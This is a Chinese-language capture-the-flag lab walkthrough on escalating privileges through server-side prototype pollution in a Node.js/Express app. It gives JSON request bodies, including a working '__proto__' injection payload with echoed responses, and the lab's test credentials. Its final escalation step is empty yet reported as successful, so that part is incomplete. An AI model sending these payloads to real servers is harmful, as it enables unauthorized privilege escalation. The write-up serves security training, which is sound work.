# 实验室：通过服务端原型污染实现权限提升

本实验室基于 Node.js 和 Express 框架构建，由于不安全地将用户可控输入合并到服务端 JavaScript 对象中，存在服务端原型污染漏洞。由于任何通过原型链继承的污染属性都会在 HTTP 响应中可见，因此该漏洞很容易检测。

要解决本实验：

1. 找到一个可用于向全局 `Object.prototype` 添加任意属性的原型污染源。
2. 识别一个可用于提升权限的小工具属性。
3. 访问管理面板并删除用户 `carlos`。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **注意**
> 在测试服务端原型污染时，可能会破坏应用程序功能甚至导致服务器完全崩溃。如果实验室发生这种情况，你可以使用实验室横幅中提供的按钮手动重启服务器。请记住，在测试真实网站时，你不太可能有此选项，因此务必谨慎操作。

探测，已知用户对象字段，以及用户对象更新功能
- 尝试批量赋值
    ```json
    {
        "address_line_1":"Wiener HQ",
        "address_line_2":"One Wiener Way",
        "city":"Wienerville",
        "postcode":"BU1 1RP",
        "country":"UK",
        "sessionId":"dIaHF1w25h6kjPPGGGireI7cBhJ0uv1V",
        "isAdmin": true
    }
    ```
    - 响应
        ```json
        "isAdmin":false
        ```
        - 失败，无法直接覆盖目标字段

- 尝试设置对象属性
    ```json
    {
        "address_line_1":"Wiener HQ",
        "address_line_2":"One Wiener Way",
        "city":"Wienerville",
        "postcode":"BU1 1RP",
        "country":"UK",
        "sessionId":"dIaHF1w25h6kjPPGGGireI7cBhJ0uv1V",
        "foo": "bar"
    }
    ```
    - 响应
        ```json
        "foo":"bar",
        "isAdmin":false
        ```
        - 成功设置对象属性，且拥有回显

- 尝试服务器端原型污染
    ```json
    {
        "address_line_1":"Wiener HQ",
        "address_line_2":"One Wiener Way",
        "city":"Wienerville",
        "postcode":"BU1 1RP",
        "country":"UK",
        "sessionId":"dIaHF1w25h6kjPPGGGireI7cBhJ0uv1V",
        "__proto__":{
            "p_foo":"p_bar"
        }
    }
    ```
    - 响应
        ```json
        "foo":"bar",
        "isAdmin":false,
        "p_foo":"p_bar"
        ```
        - 成功污染服务器原型，访问到设置的原型属性

- 尝试服务器端原型污染提权
    ```json
    {

    ```


        - 成功覆盖目标字段
